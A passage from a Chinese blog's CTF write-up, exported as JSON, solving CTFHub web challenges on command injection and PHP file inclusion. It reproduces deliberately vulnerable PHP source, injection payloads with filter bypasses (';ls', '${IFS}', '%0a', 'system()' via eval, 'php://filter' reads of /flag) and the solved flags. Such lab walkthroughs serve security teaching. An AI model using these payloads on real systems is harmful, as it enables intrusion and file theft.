id&#x3D;&quot;ip&quot; name&#x3D;&quot;ip&quot;&gt;\n    &lt;input type&#x3D;&quot;submit&quot; value&#x3D;&quot;Ping&quot;&gt;\n&lt;&#x2F;form&gt;\n\n&lt;hr&gt;\n\n&lt;pre&gt;\n&lt;?php\nif ($res) &#123;\n    print_r($res);\n&#125;\n?&gt;\n&lt;&#x2F;pre&gt;\n\n&lt;?php\nshow_source(__FILE__);\n?&gt;\n\n&lt;&#x2F;body&gt;\n&lt;&#x2F;html&gt;<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n和之前一样去查看目录。\n\n![image-20200628222315009](https://cdn.jsdelivr.net/gh/A1andNS/picgo@latest/img/20200628222727.png)\n\n使用tac命令来查看，tac为倒序输出内容。\n\n![image-20200628222709026](https://cdn.jsdelivr.net/gh/A1andNS/picgo@latest/img/20200628222711.png)\n\nctfhub{d3d712168d7a2272d4f1cd2a4bbaa32e87bdb6b5}\n\n## RCE-过滤空格\n\n过滤了空格试一试用/**/来代替空格。\n\n<pre class=\"line-numbers language-php+HTML\" data-language=\"php+HTML\"><code class=\"language-php+HTML\">&lt;?php\n\n$res &#x3D; FALSE;\n\nif (isset($_GET[&#39;ip&#39;]) &amp;&amp; $_GET[&#39;ip&#39;]) &#123;\n    $ip &#x3D; $_GET[&#39;ip&#39;];\n    $m &#x3D; [];\n    if (!preg_match_all(&quot;&#x2F; &#x2F;&quot;, $ip, $m)) &#123;\n        $cmd &#x3D; &quot;ping -c 4 &#123;$ip&#125;&quot;;\n        exec($cmd, $res);\n    &#125; else &#123;\n        $res &#x3D; $m;\n    &#125;\n&#125;\n?&gt;\n\n&lt;!DOCTYPE html&gt;\n&lt;html&gt;\n&lt;head&gt;\n    &lt;title&gt;CTFHub 命令注入-过滤空格&lt;&#x2F;title&gt;\n&lt;&#x2F;head&gt;\n&lt;body&gt;\n\n&lt;h1&gt;CTFHub 命令注入-过滤空格&lt;&#x2F;h1&gt;\n\n&lt;form action&#x3D;&quot;#&quot; method&#x3D;&quot;GET&quot;&gt;\n    &lt;label for&#x3D;&quot;ip&quot;&gt;IP : &lt;&#x2F;label&gt;&lt;br&gt;\n    &lt;input type&#x3D;&quot;text&quot; id&#x3D;&quot;ip&quot; name&#x3D;&quot;ip&quot;&gt;\n    &lt;input type&#x3D;&quot;submit&quot; value&#x3D;&quot;Ping&quot;&gt;\n&lt;&#x2F;form&gt;\n\n&lt;hr&gt;\n\n&lt;pre&gt;\n&lt;?php\nif ($res) &#123;\n    print_r($res);\n&#125;\n?&gt;\n&lt;&#x2F;pre&gt;\n\n&lt;?php\nshow_source(__FILE__);\n?&gt;\n\n&lt;&#x2F;body&gt;\n&lt;&#x2F;html&gt;<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n![image-20200628223002682](https://cdn.jsdelivr.net/gh/A1andNS/picgo@latest/img/20200628223003.png)\n\n/**/没有用，%20也不行，后来也是边查边试，%09、<、>、<>、{,}都不好使，${IFS}可以用。\n\n![image-20200628223317074](https://cdn.jsdelivr.net/gh/A1andNS/picgo@latest/img/20200628223319.png)\n\nctfhub{a353a9c308a2887a369a60259d3ac8750cf987a5}\n\n## RCE-过滤目录分割符\n\n<pre class=\"line-numbers language-php+HTML\" data-language=\"php+HTML\"><code class=\"language-php+HTML\">&lt;?php\n\n$res &#x3D; FALSE;\n\nif (isset($_GET[&#39;ip&#39;]) &amp;&amp; $_GET[&#39;ip&#39;]) &#123;\n    $ip &#x3D; $_GET[&#39;ip&#39;];\n    $m &#x3D; [];\n    if (!preg_match_all(&quot;&#x2F;\\&#x2F;&#x2F;&quot;, $ip, $m)) &#123;\n        $cmd &#x3D; &quot;ping -c 4 &#123;$ip&#125;&quot;;\n        exec($cmd, $res);\n    &#125; else &#123;\n        $res &#x3D; $m;\n    &#125;\n&#125;\n?&gt;\n\n&lt;!DOCTYPE html&gt;\n&lt;html&gt;\n&lt;head&gt;\n    &lt;title&gt;CTFHub 命令注入-过滤目录分隔符&lt;&#x2F;title&gt;\n&lt;&#x2F;head&gt;\n&lt;body&gt;\n\n&lt;h1&gt;CTFHub 命令注入-过滤目录分隔符&lt;&#x2F;h1&gt;\n\n&lt;form action&#x3D;&quot;#&quot; method&#x3D;&quot;GET&quot;&gt;\n    &lt;label for&#x3D;&quot;ip&quot;&gt;IP : &lt;&#x2F;label&gt;&lt;br&gt;\n    &lt;input type&#x3D;&quot;text&quot; id&#x3D;&quot;ip&quot; name&#x3D;&quot;ip&quot;&gt;\n    &lt;input type&#x3D;&quot;submit&quot; value&#x3D;&quot;Ping&quot;&gt;\n&lt;&#x2F;form&gt;\n\n&lt;hr&gt;\n\n&lt;pre&gt;\n&lt;?php\nif ($res) &#123;\n    print_r($res);\n&#125;\n?&gt;\n&lt;&#x2F;pre&gt;\n\n&lt;?php\nshow_source(__FILE__);\n?&gt;\n\n&lt;&#x2F;body&gt;\n&lt;&#x2F;html&gt;<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n`127.0.0.1;ls`\n\n![image-20200628223550561](https://cdn.jsdelivr.net/gh/A1andNS/picgo@latest/img/20200628224218.png)\n\n`127.0.0.1;ls flag_is_here`\n\n![image-20200628223917466](https://cdn.jsdelivr.net/gh/A1andNS/picgo@latest/img/20200628224214.png)\n\n发现有一个目录是flag_is_here，那么就会用到/，但是/已经被过滤了，看一下多重查询吧。\n\n`127.0.0.1;cd flag_is_here;cat flag_10742619119266 `\n\n![image-20200628224040828](https://cdn.jsdelivr.net/gh/A1andNS/picgo@latest/img/20200628224207.png)\n\nctfhub{42c0df575f8ef8f2d2c514451e8e38e56af91807}\n\n## RCE-过滤运算符\n\n<pre class=\"line-numbers language-php+HTML\" data-language=\"php+HTML\"><code class=\"language-php+HTML\">&lt;?php\n\n$res &#x3D; FALSE;\n\nif (isset($_GET[&#39;ip&#39;]) &amp;&amp; $_GET[&#39;ip&#39;]) &#123;\n    $ip &#x3D; $_GET[&#39;ip&#39;];\n    $m &#x3D; [];\n    if (!preg_match_all(&quot;&#x2F;(\\||\\&amp;)&#x2F;&quot;, $ip, $m)) &#123;\n        $cmd &#x3D; &quot;ping -c 4 &#123;$ip&#125;&quot;;\n        exec($cmd, $res);\n    &#125; else &#123;\n        $res &#x3D; $m;\n    &#125;\n&#125;\n?&gt;\n\n&lt;!DOCTYPE html&gt;\n&lt;html&gt;\n&lt;head&gt;\n    &lt;title&gt;CTFHub 命令注入-过滤运算符&lt;&#x2F;title&gt;\n&lt;&#x2F;head&gt;\n&lt;body&gt;\n\n&lt;h1&gt;CTFHub 命令注入-过滤运算符&lt;&#x2F;h1&gt;\n\n&lt;form action&#x3D;&quot;#&quot; method&#x3D;&quot;GET&quot;&gt;\n    &lt;label for&#x3D;&quot;ip&quot;&gt;IP : &lt;&#x2F;label&gt;&lt;br&gt;\n    &lt;input type&#x3D;&quot;text&quot; id&#x3D;&quot;ip&quot; name&#x3D;&quot;ip&quot;&gt;\n    &lt;input type&#x3D;&quot;submit&quot; value&#x3D;&quot;Ping&quot;&gt;\n&lt;&#x2F;form&gt;\n\n&lt;hr&gt;\n\n&lt;pre&gt;\n&lt;?php\nif ($res) &#123;\n    print_r($res);\n&#125;\n?&gt;\n&lt;&#x2F;pre&gt;\n\n&lt;?php\nshow_source(__FILE__);\n?&gt;\n\n&lt;&#x2F;body&gt;\n&lt;&#x2F;html&gt;<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n|、&都被过滤了，但是可以用；啊，所以问题不大。\n\n`127.0.0.1;ls`\n\n![image-20200628224623944](https://cdn.jsdelivr.net/gh/A1andNS/picgo@latest/img/20200628224948.png)\n\n`127.0.0.1;cat flag_13781671312162.php`\n\n![image-20200628224735719](https://cdn.jsdelivr.net/gh/A1andNS/picgo@latest/img/20200628224736.png)\n\nctfhub{936a9fdae7b6722a79a1d6bec50caefbe8701150}\n\n## 综合过滤练习\n\n<pre class=\"line-numbers language-php+HTML\" data-language=\"php+HTML\"><code class=\"language-php+HTML\">&lt;?php\n\n$res &#x3D; FALSE;\n\nif (isset($_GET[&#39;ip&#39;]) &amp;&amp; $_GET[&#39;ip&#39;]) &#123;\n    $ip &#x3D; $_GET[&#39;ip&#39;];\n    $m &#x3D; [];\n    if (!preg_match_all(&quot;&#x2F;(\\||&amp;|;| |\\&#x2F;|cat|flag|ctfhub)&#x2F;&quot;, $ip, $m)) &#123;\n        $cmd &#x3D; &quot;ping -c 4 &#123;$ip&#125;&quot;;\n        exec($cmd, $res);\n    &#125; else &#123;\n        $res &#x3D; $m;\n    &#125;\n&#125;\n?&gt;\n\n&lt;!DOCTYPE html&gt;\n&lt;html&gt;\n&lt;head&gt;\n    &lt;title&gt;CTFHub 命令注入-综合练习&lt;&#x2F;title&gt;\n&lt;&#x2F;head&gt;\n&lt;body&gt;\n\n&lt;h1&gt;CTFHub 命令注入-综合练习&lt;&#x2F;h1&gt;\n\n&lt;form action&#x3D;&quot;#&quot; method&#x3D;&quot;GET&quot;&gt;\n    &lt;label for&#x3D;&quot;ip&quot;&gt;IP : &lt;&#x2F;label&gt;&lt;br&gt;\n    &lt;input type&#x3D;&quot;text&quot; id&#x3D;&quot;ip&quot; name&#x3D;&quot;ip&quot;&gt;\n    &lt;input type&#x3D;&quot;submit&quot; value&#x3D;&quot;Ping&quot;&gt;\n&lt;&#x2F;form&gt;\n\n&lt;hr&gt;\n\n&lt;pre&gt;\n&lt;?php\nif ($res) &#123;\n    print_r($res);\n&#125;\n?&gt;\n&lt;&#x2F;pre&gt;\n\n&lt;?php\nshow_source(__FILE__);\n?&gt;\n\n&lt;&#x2F;body&gt;\n&lt;&#x2F;html&gt;<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n过滤了|、&、；、 、/、cat、flag、ctfhub\n\n`127.0.0.1%0als`\n\n![image-20200628230357331](https://cdn.jsdelivr.net/gh/A1andNS/picgo@latest/img/20200628230358.png)\n\n`127.0.0.1%0acd${IFS}f***_is_here%0als`\n\n![image-20200628230608227](https://cdn.jsdelivr.net/gh/A1andNS/picgo@latest/img/20200628230609.png)\n\n`127.0.0.1%0acd${IFS}f***_is_here%0atac${IFS}f***_1604066874064.php`\n\n![NR5E8I.png](https://s1.ax1x.com/2020/06/28/NR5E8I.png)\n\nctfhub{2ec92a03ba9f32415c90ec0f1774256c45363ffb}\n\n## RCE-eval\n\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_REQUEST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'cmd'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">eval</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_REQUEST</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"cmd\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">else</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n<span class=\"token delimiter important\">?></span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n源码在此eval函数直接执行了传入的cmd参数，这是一个很严重的错误。之前学Python的时候就写过一个关于eval函数执行命令的blog，eval也是在代码审计过程中重点关注的对象。\n\nhttp://challenge-a70680c9bd2e7657.sandbox.ctfhub.com:10080/?cmd=system(\"ls ../../../\");\n\n发现在了flag文件，直接读flag\n\n![w44AdH.png](https://s1.ax1x.com/2020/09/18/w44AdH.png)\n\n## RCE-php://input\n\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'file'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> <span class=\"token function\">substr</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"file\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">6</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">===</span> <span class=\"token string double-quoted-string\">\"php://\"</span> <span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">include</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"file\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">else</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"Hacker!!!\"</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">else</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n<span class=\"token delimiter important\">?></span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n还给了一句i don't have shell, how to get flag?\n\n查看phpinfo文件可以看到根目录为/var/www/html\n\n![wI1w6S.png](https://s1.ax1x.com/2020/09/19/wI1w6S.png)\n\n然后就执行命令寻找flag\n\n![wI1rwj.png](https://s1.ax1x.com/2020/09/19/wI1rwj.png)\n\n得到flag。\n\n## 读取源代码\n\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token function\">error_reporting</span><span class=\"token punctuation\">(</span><span class=\"token constant\">E_ALL</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'file'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> <span class=\"token function\">substr</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"file\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">6</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">===</span> <span class=\"token string double-quoted-string\">\"php://\"</span> <span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">include</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"file\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">else</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"Hacker!!!\"</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">else</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n<span class=\"token delimiter important\">?></span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>hr</span><span class=\"token punctuation\">></span></span>\ni don't have shell, how to get flag? <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>br</span><span class=\"token punctuation\">></span></span>\nflag in <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>code</span><span class=\"token punctuation\">></span></span>/flag<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>code</span><span class=\"token punctuation\">></span></span>\ni don't have shell, how to get flag?\nflag in /flag<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\nphp伪协议读内容：\n\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;resource&#x3D;&#x2F;flag<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n![wI6hjg.png](https://s1.ax1x.com/2020/09/19/wI6hjg.png)\n\n得到flag，很多时候还要用\n\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;&#x2F;flag<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n\n\n","text":"XSS之反射性用了一个XSS平台叫xss8.cc cookie : flag=ctfhub{c6deb9f1323dc3d8ed565bcd6e5382e91aee9c5b} SQL-过滤空格这个最近新更新的技能树内容，空格被过滤了，要想办法来绕过啊。 出现空格就是hack +是...","link":"","photos":[],"count_time":{"symbolsCount":"15k","symbolsTime":"13 mins."},"categories":[{"name":"CTF","slug":"CTF","count":43,"path":"api/categories/CTF.json"}],"tags":[{"name":"CTF","slug":"CTF","count":15,"path":"api/tags/CTF.json"},{"name":"WEB","slug":"WEB","count":39,"path":"api/tags/WEB.json"}],"toc":"<ol class=\"toc\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#XSS%E4%B9%8B%E5%8F%8D%E5%B0%84%E6%80%A7\"><span class=\"toc-text\">XSS之反射性</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#SQL-%E8%BF%87%E6%BB%A4%E7%A9%BA%E6%A0%BC\"><span class=\"toc-text\">SQL-过滤空格</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-%E6%97%A0%E9%AA%8C%E8%AF%81\"><span class=\"toc-text\">文件上传-无验证</span></a></li></ol>","author":{"name":"A1andNS","slug":"blog-author","avatar":"/svg/head.png","link":"/","description":"爱你所爱，行你所行，听从你心，无问西东","socials":{"github":"https://github.com/A1andNS","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}},"mapped":true,"prev_post":{"title":"第五空间WEB之hate-php","uid":"64631c5ddb0aa3cce868e64df4ac6772","slug":"第五空间WEB之hate-php","date":"2020-06-28T04:15:47.000Z","updated":"2020-06-28T06:26:04.000Z","comments":true,"path":"api/articles/第五空间WEB之hate-php.json","keywords":"A1andNS","cover":[],"text":"hate-php 复现平台：CTFHUB 题目来源：“第五空间”智能安全大赛WEB题 题目上来直接给源码： &lt;?php error_reporting(0); if(!isset($_GET['code']))&#123; highlight_file(__FILE__);...","link":"","photos":[],"count_time":{"symbolsCount":955,"symbolsTime":"1 mins."},"categories":[{"name":"CTF","slug":"CTF","count":43,"path":"api/categories/CTF.json"}],"tags":[{"name":"CTF","slug":"CTF","count":15,"path":"api/tags/CTF.json"},{"name":"WEB","slug":"WEB","count":39,"path":"api/tags/WEB.json"}],"author":{"name":"A1andNS","slug":"blog-author","avatar":"/svg/head.png","link":"/","description":"爱你所爱，行你所行，听从你心，无问西东","socials":{"github":"https://github.com/A1andNS","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}}},"next_post":{"title":"Linux学习(一）","uid":"792f8acb0007434600568d85ccdd061c","slug":"Linux学习-一）","date":"2020-06-01T13:10:48.000Z","updated":"2020-10-16T09:54:22.000Z","comments":true,"path":"api/articles/Linux学习-一）.json","keywords":"A1andNS","cover":"https://cdn.jsdelivr.net/gh/A1andNS/picgo/img/20200601211235.jpg","text":"Linux常识Linux 内核最初只是由芬兰人林纳斯·托瓦兹（Linus Torvalds）在赫尔辛基大学上学时出于个人爱好而编写的。Linux 是一套免费使用和自由传播的类 Unix 操作系统，是一个基于 POSIX 和 UNIX 的多用户、多任务、支持多线程和多 CPU 的操...","link":"","photos":[],"count_time":{"symbolsCount":"4.2k","symbolsTime":"4 mins."},"categories":[{"name":"Linux学习","slug":"Linux学习","count":7,"path":"api/categories/Linux学习.json"}],"tags":[{"name":"Linux","slug":"Linux","count":11,"path":"api/tags/Linux.json"}],"author":{"name":"A1andNS","slug":"blog-author","avatar":"/svg/head.png","link":"/","description":"爱你所爱，行你所行，听从你心，无问西东","socials":{"github":"https://github.com/A1andNS","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}}}}